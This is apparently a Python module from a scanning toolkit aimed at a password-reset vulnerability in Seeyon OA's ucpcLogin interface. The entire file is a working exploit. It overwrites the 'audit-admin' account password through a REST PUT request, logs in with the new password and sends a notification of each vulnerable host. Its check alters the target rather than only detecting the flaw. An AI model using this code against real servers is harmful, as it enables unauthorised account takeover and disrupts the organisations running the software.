# seeyon-ucpclogin-passwordreset
import ServerJ
import requests
from requests.packages.urllib3.exceptions import InsecureRequestWarning
from requests.exceptions import Timeout
import os
import urllib.parse
import urllib.request
import re
import time
import ssl
import urllib
from urllib.parse import urljoin, quote
import ServerJ

bugName = '致远OA ucpcLogin存在密码重置漏洞'


def scan_seeyon_ucpclogin_passwordreset(url, proxies, headers, append_to_output, serverJ,bugName):
    if not url.startswith('http://') and not url.startswith('https://'):
        url = 'http://' + url
    path = "/seeyon/rest/orgMember/-4401606663639775639/password/share.do"
    headers = {
        "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:123.0) Gecko/20100101 Firefox/123.0",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
        "Accept-Encoding": "gzip, deflate, br",
        "Accept-Language": "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2",
        "Connection": "close",
        "cookie": "JSESSIONID=3891CB3E3CA435C599001E4F03A335B0; loginPageURL="
    }
    encodetext = url + path

    headers2 = {
        "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:123.0) Gecko/20100101 Firefox/123.0",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
        "Accept-Encoding": "gzip, deflate, br",
        "Accept-Language": "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2",
        "Connection": "close",
        "Content-Type": "application / x - www - form - urlencoded"
    }
    path2="/seeyon/rest/authentication/ucpcLogin?login_username=audit-admin&login_password=share.do&ticket="
    encodetext2 = url + path2

    try:
        requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
        req = requests.put(encodetext, headers=headers, verify=False, timeout=3, proxies=proxies)
        if req.status_code == 200:
            try:
                req2 = requests.post(encodetext2, headers=headers2, verify=False, timeout=3, proxies=proxies)
                if req2.status_code == 200 and "ok" in req2.text and "audit-admin" in req2.text:
                    append_to_output(f"[+] {url} 存在{bugName}！！！！", "red")
                    ServerJ.sc_send({bugName}, f"漏洞连接: {url}\r ", ServerJ_switch=serverJ)
                else:
                    append_to_output(f"[-] {url} 不存在{bugName}", "green")
            except Timeout:
                append_to_output(f"[!] 请求超时，跳过URL: {url}", "yellow")
        else:
            append_to_output(f"[-] {url} 不存在{bugName}", "green")
    except Timeout:
        append_to_output(f"[!] 请求超时，跳过URL: {url}", "yellow")
    except Exception as e:
        if 'HTTPSConnectionPool' in str(e) or 'Burp Suite Professional' in str(e):
            append_to_output(f"[-] {url} 证书校验错误或者证书被拒绝", "yellow")
        else:
            append_to_output(str(e), "yellow")


